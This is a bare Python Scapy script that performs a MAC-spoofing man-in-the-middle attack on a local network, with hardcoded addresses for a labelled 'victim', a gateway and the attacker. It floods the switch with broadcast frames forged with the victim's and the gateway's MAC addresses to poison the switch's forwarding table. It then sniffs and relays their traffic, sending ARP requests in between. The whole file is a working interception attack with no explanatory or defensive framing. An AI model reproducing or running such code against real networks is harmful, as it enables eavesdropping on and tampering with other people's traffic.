from scapy.all import *
from scapy.layers.inet import Ether, IP, TCP, ARP
import time
import threading

gateway_mac='52:54:00:88:15:b6'
victim_mac='08:00:27:24:32:1f'
my_mac='70:4d:7b:3b:ca:f2'
broadcast_mac='ff:ff:ff:ff:ff:ff'
my_ip='192.168.20.42'
gateway_ip='192.168.20.1'
victim_ip='192.168.20.228'



def sniffed(pckt):
	if (pckt[Ether].dst==gateway_mac and pckt[Ether].src==victim_mac):
		chi_e_pf()
		t = threading.Thread(target=sono_h)
		t.start()
		sendp(pckt)
		chi_e_h()
	elif (pckt[Ether].dst==victim_mac and pckt[Ether].src==gateway_mac):
		sendp(pckt)
		t = threading.Thread(target=sono_pf)
		t.start()
	
		
def sono_pf():
	for x in range(10):
		print("arpizzo pf")
		sendp(Ether(dst='ff:ff:ff:ff:ff:ff',src=gateway_mac)/IP(src=str(RandIP()),dst=str(RandIP()))/TCP(sport=2321,dport=23423,flags='R',options=[('Timestamp',(0,0))]))
		time.sleep(0.2)
def sono_h():
	for x in range(10):
		print("arpizzo h")
		sendp(Ether(dst='ff:ff:ff:ff:ff:ff',src=victim_mac)/IP(src=str(RandIP()),dst=str(RandIP()))/TCP(sport=2321,dport=23423,flags='R',options=[('Timestamp',(0,0))]))
		time.sleep(0.2)

def chi_e_pf():
	sendp(Ether(dst=broadcast_mac,src=my_mac)/ARP(op=1,psrc=my_ip,pdst=gateway_ip))

def chi_e_h():
	sendp(Ether(dst=broadcast_mac,src=my_mac)/ARP(op=1,psrc=my_ip,pdst=victim_ip))

t = threading.Thread(target=sono_pf)
t.start()
while 1:
	sniff(lfilter=lambda d: (d.dst==gateway_mac and d.src==victim_mac) or (d.dst==victim_mac and d.src==gateway_mac), prn=sniffed)
